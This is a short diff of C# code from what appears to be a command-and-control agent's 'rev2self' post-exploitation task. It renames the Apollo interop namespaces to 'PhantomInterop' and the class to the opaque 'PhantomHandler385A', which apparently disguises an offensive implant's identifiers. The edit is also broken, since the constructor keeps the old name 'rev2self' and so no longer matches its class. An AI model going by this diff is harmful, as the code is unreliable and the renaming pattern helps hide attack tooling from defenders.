@@ -7,13 +7,13 @@
 #if REV2SELF
 
 
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 
 namespace Tasks
 {
-    public class rev2self : Tasking
+    public class PhantomHandler385A : Tasking
     {
         public rev2self(IAgent agent, MythicTask data) : base(agent, data)
         {
